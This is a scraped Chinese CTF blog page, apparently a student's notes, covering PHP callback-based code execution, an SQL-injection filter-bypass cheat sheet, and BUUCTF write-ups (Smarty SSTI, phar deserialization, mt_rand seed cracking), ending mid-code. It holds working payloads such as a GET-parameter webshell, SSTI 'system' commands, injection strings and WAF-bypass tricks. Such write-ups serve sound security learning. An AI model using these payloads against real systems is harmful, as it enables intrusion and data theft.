<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">	$array1=array($cmd);</span><br><span class="line">	$func=$_GET[&#x27;func&#x27;];</span><br><span class="line">	array_filter($array,$func)</span><br><span class="line">?&gt;</span><br><span class="line">这个函数不同于上面，这里参数在前，函数在后。</span><br><span class="line"></span><br><span class="line">php5.6以上</span><br><span class="line">sort</span><br><span class="line">usort($_GET)</span><br><span class="line"></span><br><span class="line">?1[]=phpinfo()&amp;1[]=123&amp;2=assert()</span><br></pre></td></tr></table></figure>





<p>5、其他</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$&#123;php代码&#125;</span><br><span class="line">&lt;?php</span><br><span class="line">	$&#123;php代码&#125;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line">$func=$&#123;phpinfo()&#125;;</span><br><span class="line">$func();</span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    
<div>
  
</div>
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/20/CTF-SQL/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/cat.jpg">
      <meta itemprop="name" content="WJW">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="WJW's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/20/CTF-SQL/" class="post-title-link" itemprop="url">CTF-SQL</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-20 13:52:50" itemprop="dateCreated datePublished" datetime="2021-05-20T13:52:50+08:00">2021-05-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-05-23 13:53:32" itemprop="dateModified" datetime="2021-05-23T13:53:32+08:00">2021-05-23</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.5k</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="CTF-SQL注入基础"><a href="#CTF-SQL注入基础" class="headerlink" title="CTF-SQL注入基础"></a>CTF-SQL注入基础</h4><h4 id="万能密码："><a href="#万能密码：" class="headerlink" title="万能密码："></a>万能密码：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>



<p><strong>主要是逻辑or，返回true，密码正确。</strong></p>
<ul>
<li>burp需要使用+或%20代替空格</li>
</ul>
<p><strong>sql注入类型：数字型、字符串类型</strong></p>
<ul>
<li>sql语句中的括号不代表实际意义，主要用于优先级处理。</li>
</ul>
<p><strong>sql注入可能存在的位置：</strong></p>
<p>1、URL提交参数，GET型</p>
<p>2、HTTP请求主体，POST型</p>
<p>3、请求头(cookie,user-agent,referer)</p>
<p><strong>sql注入利用</strong></p>
<p>1、获取数据库信息</p>
<p>2、获取系统命令执行shell</p>
<p>3、上传、下载服务器文件(webshell)等</p>
<p><strong>技法：</strong></p>
<p><strong>联合注入、布尔盲注、延时注入、报错注入、堆叠注入、宽字节注入、二次注入、无列名注入等等。</strong></p>
<h4 id="CTF-SQL注入技巧"><a href="#CTF-SQL注入技巧" class="headerlink" title="CTF-SQL注入技巧"></a>CTF-SQL注入技巧</h4><p>url中字符的特殊含义：</p>
<p>1、&amp;表示get提交参数的分隔符，如果sql注入中将and替换成&amp;&amp;，要对&amp;进行URL编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;-&gt;%26%26</span><br></pre></td></tr></table></figure>



<p>2、#表示锚点，点击当前的链接会跳转到当前页面的某个位置，sql注入需要对#进行URL编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#-&gt;%23</span><br></pre></td></tr></table></figure>



<p>3、web站点默认访问index开头的页面，可以省略index.php</p>
<p>4、web站点默认端口使用80端口，可省略。若非80端口，不可省略。</p>
<p>绕过过滤姿势</p>
<p><em>1、常用注释符</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--空格</span><br><span class="line">--+</span><br><span class="line">/*注释*/</span><br><span class="line">在mysql中是多行注释 但是如果里面加了! 那么后面的内容会被执	行</span><br><span class="line">#</span><br></pre></td></tr></table></figure>

<p><em>2、大小写绕过</em></p>
<p><em>3、双写绕过</em></p>
<p><em>4、内联注释绕过</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 union /*!select*/ 1,2,3;</span><br><span class="line">加了感叹号，select会被执行。</span><br></pre></td></tr></table></figure>

<p><em>5、单引号过滤</em></p>
<ul>
<li>十六进制绕过</li>
<li>char函数绕过</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char(ascii)+char(ascii)+char(ascii)</span><br></pre></td></tr></table></figure>



<p><em>6、空格过滤</em></p>
<ul>
<li>括号绕过</li>
</ul>
<p>遵循查什么，从哪里，符合条件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(id)from(users)where(id=1)</span><br></pre></td></tr></table></figure>



<ul>
<li>注释符绕过空格</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">空格-&gt;/**/</span><br></pre></td></tr></table></figure>

<ul>
<li>反引号绕过</li>
</ul>
<p>由于数据库默认识别关键字，不需要加引号，但是无法自动识别用户定义的表名和字段名，此时使用反引号指定。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select*from`users`where`id`=1</span><br></pre></td></tr></table></figure>



<ul>
<li>其他空白字符</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># ascii table：</span><br><span class="line"># TAB水平 09 url编码 %09</span><br><span class="line"># 新行  0A %0A</span><br><span class="line"># 新页  0C %0C</span><br><span class="line"># 回车  0D %0D</span><br><span class="line"># TAB垂直 0B        %0B</span><br></pre></td></tr></table></figure>





<p><em>7、等号过滤</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">like或rlike</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">between and</span><br><span class="line">select * from users where id between 1 and 1</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regexp代替=</span><br></pre></td></tr></table></figure>



<p><em>8、逗号绕过</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr(&#x27;users&#x27;,1,1)=</span><br><span class="line">select substr(&#x27;users&#x27; from 1 for 1)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from users limit 0,1</span><br><span class="line">select * from users limit 1 offset 0;</span><br><span class="line">第一个参数不为0,从1开始</span><br><span class="line">第二个参数为偏移量</span><br></pre></td></tr></table></figure>



<p><em>9、过滤了运算比较符号</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">greatest(n1,n2,n3..)返回最大值</span><br><span class="line"></span><br><span class="line">greatest(ascii(substr(database(),1,1)),1)=97;</span><br><span class="line"></span><br><span class="line">least(n1,n2,n3..)返回最小值</span><br><span class="line"></span><br><span class="line">strcmp(str1,str2)</span><br><span class="line">所有字符串相等返回0,小于返回-1,大于返回1</span><br></pre></td></tr></table></figure>



<h4 id="约束注入"><a href="#约束注入" class="headerlink" title="约束注入"></a>约束注入</h4><p>一般注入点存在注册的时候，对于管理员密码的任意修改</p>
<p>关键函数varchar()，当sql语句语句超过varchar定于的最大长度，并且没有唯一键约束。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin                           x</span><br></pre></td></tr></table></figure>



<p>SQL语句设置和取消唯一键约束：</p>
<p>取消唯一键</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table admin drop unique username</span><br></pre></td></tr></table></figure>

<p>设置唯一键</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table admin add unique (username)</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
<div>
  
</div>
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/07/buu3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/cat.jpg">
      <meta itemprop="name" content="WJW">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="WJW's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/07/buu3/" class="post-title-link" itemprop="url">buu3</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-07 20:58:59" itemprop="dateCreated datePublished" datetime="2021-05-07T20:58:59+08:00">2021-05-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-07-23 13:01:26" itemprop="dateModified" datetime="2021-07-23T13:01:26+08:00">2021-07-23</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>33k</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h3><p>最后一行提示smarty</p>
<p>即：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/91595921">Smarty SSTI</a></p>
<p><img src="buu3.md/1.png"></p>
<p>证明存在<em><strong>Smarty SSTI</strong></em>注入，只有一个花括号，构造payload：</p>
<p><code>&#123;if readfile(&#39;/flag&#39;)&#125;&#123;/if&#125;</code></p>
<p>补充smarty常用payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&#x27;ls&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123; readfile(&#x27;/flag&#x27;) &#125;</span><br><span class="line">&#123;if show_source(&#x27;/flag&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&#x27;cat ../../../flag&#x27;)&#125;&#123;/if&#125; </span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ever_peng/article/details/80008638">ARP协议</a></p>
<h3 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h3><p><strong>open_basedir</strong></p>
<p><em><strong>在in_set这个函数中，可以设置php的一些配置，其中就包括open_basedir ，用来限制当前程序可以访问的目录，它是可以访问设置目录下的所有下级目录。</strong></em><br><em><strong>如果“open_basedir = /dir/user”, 那么目录 “/dir/user” 和 “/dir/其他任何有的目录”都是可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。”.”可代表当前目录，open_basedir也可以同时设置多个目录,在Windows中用分号分隔目录,在任何其它系统中用冒号分隔目录。</strong></em><br><em><strong>如：ini_set(“open_basedir”, getcwd() . “:/etc:/tmp”); 就是只可以访问当前目录(getcwd()返回当前目录)、/etc和/tmp三个目录</strong></em></p>
<p><strong>chdir() mkdir()</strong></p>
<p><em><strong>chdir() 现实目录跳跃，所以下载时要加../</strong></em></p>
<p>首先注册登陆，可以上传文件，抓包发现，下载的文件参数可控，存在任意文件下载。</p>
<p><img src="buu3.md/2.png">尝试下载index.php文件，返回不存在此文件。通过../进行下一目录访问</p>
<p><img src="buu3.md/3.png"></p>
<p>成功下载index.php文件。发现还有login.php,class.php,存在序列化。还存在delete.php,upload.php。</p>
<p>不需要每个都看，有侧重点。</p>
<p>看一下大佬总结的<a target="_blank" rel="noopener" href="http://t.zoukankan.com/Cl0ud-p-12177071.html">wp</a></p>
<p>首先题目就有提示有关<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2715">phar</a></p>
<p>我们可以把一个序列化的对象，储存在phar格式的文件中，生成后（一定要是生成后），即使我们把格式给改了，也不影响它的作用：用一些文件包含函数，如果我们以phar://协议去访问这个文件，那么就可以把那个对象给反序列化。</p>
<p><img src="buu3/4.png"></p>
<p>我们就让$this-&gt;db = new FileList()，让它去调用close，然后调用__call(),然后再调用 __destruct()函数，打印结果</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// add object of any class as meta data</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;files=<span class="keyword">array</span>(<span class="keyword">new</span> File());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag.txt&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$b</span>=<span class="keyword">new</span> FileList();</span><br><span class="line">	<span class="variable">$c</span>=<span class="keyword">new</span> User();</span><br><span class="line">	<span class="variable">$c</span>-&gt;db=<span class="variable">$b</span>;</span><br><span class="line">    </span><br><span class="line"> <span class="comment">// create new Phar</span></span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;text&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$c</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>为了在本地生成phar文件，记得在php.ini配置文件里面修改phar.readonly设置为off，再上传读取。</p>
<h3 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h3><p>f12查看源码，就有flag。</p>
<h3 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h3><p>访问check.php,有源码，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！ </span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line">session_start(); </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123; </span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">mt_srand(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]); </span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>; </span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>; </span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123; </span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);        </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$str_show</span> = substr(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;x </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">show_source(<span class="string">&quot;check.php&quot;</span>); </span><br></pre></td></tr></table></figure>

<p><em><strong>每次产生的字符串都是随机的，让我们自己去猜，是不可能猜到的，这里还要求严格等于，不能使用之前的方法绕过。</strong></em></p>
<p><em><strong>其实在前面学习c语言的时候就遇到过rand函数产生的是随机数，需要通过time(0)返回值做随机种子。</strong></em></p>
<p><em><strong>这里我们就需要通过给我们的伪随机数，获取种子，再通过种子获得完整的随机数。需要通过脚本实现。</strong></em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">s = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;C2EHFSxFPp&#x27;</span></span><br><span class="line">m = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        <span class="keyword">if</span> i == s[j]:</span><br><span class="line">            m += <span class="string">&quot;&#123;&#125; &#123;&#125; 0 &#123;&#125; &quot;</span>.<span class="built_in">format</span>(j,j,<span class="built_in">len</span>(s)-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># 38 38 0 61 28 28 0 61 40 40 0 61 43 43 0 61 41 41 0 61 54 54 0 61 23 23 0 61 41 41 0 61 51 51 0 61 15 15 0 61</span></span><br></pre></td></tr></table></figure>

<p>使用工具：<strong>php_mt_seed4.0</strong></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46250265/article/details/113919405">安装教程及注意事项</a></p>
<p>输入</p>
<p><code>./php_mt_seed 38 38 0 61 28 28 0 61 40 40 0 61 43 43 0 61 41 41 0 61 54 54 0 61 23 23 0 61 41 41 0 61 51 51 0 61 15 15 0 61</code></p>
<p>进行破解，得到数字109706244</p>
<p><img src="buu3.md/5.png"></p>
<p>然后再通过函数mt_rand()产生字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">109706244</span>);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>再次输入完整字符串，得到flag。</p>
<h3 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h3><p><em><strong>f12源码中就存在需要我们绕过的，符合题目的套娃，层层递进。</strong></em></p>
<p><em><strong>想到这里跟前面php字符串解析特性有关系，前面有一题是通过在num参数前加空格会被解析成num(自动把空格去掉了)。</strong></em></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/213359.html">php字符串解析特性</a></p>
<p><em>由<strong>于php字符串解析特性，会把包括空格内的某些字符转化成下划线</strong></em></p>
<p><em><strong>我们可以通过空格代替_下划线。</strong></em></p>
<p><em><strong>在绕过第二个通过换行符%0a经url加密后。得到最后payload：</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b u p t=23333%0a</span><br></pre></td></tr></table></figure>

<p><em><strong>得到flag在文件secrettw.php</strong></em></p>
<p><em><strong>需要本地才能，我们使用burp，添加xff消息头。</strong></em></p>
<p><img src="buu3/6.png"></p>
<p><em><strong>得到一段jsfuck编码，f12到控制台中输入，弹出post提交Merak</strong></em></p>
<p><img src="buu3/7.png"></p>
<p><em><strong>我们随便post提交参数Merak一下，源码就出来了。</strong></em></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = base64_decode(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$v</span>);<span 